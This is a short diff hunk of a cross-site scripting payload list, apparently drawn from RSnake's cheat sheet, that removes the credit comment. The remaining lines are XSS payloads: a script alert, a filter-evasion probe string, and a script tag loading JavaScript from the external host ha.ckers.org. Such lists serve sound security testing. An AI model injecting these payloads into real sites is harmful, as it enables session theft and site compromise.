@@ -1,4 +1,3 @@
-# credit to rsnake
 <SCRIPT>alert('XSS');</SCRIPT>
 '';!--"<XSS>=&{()}
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
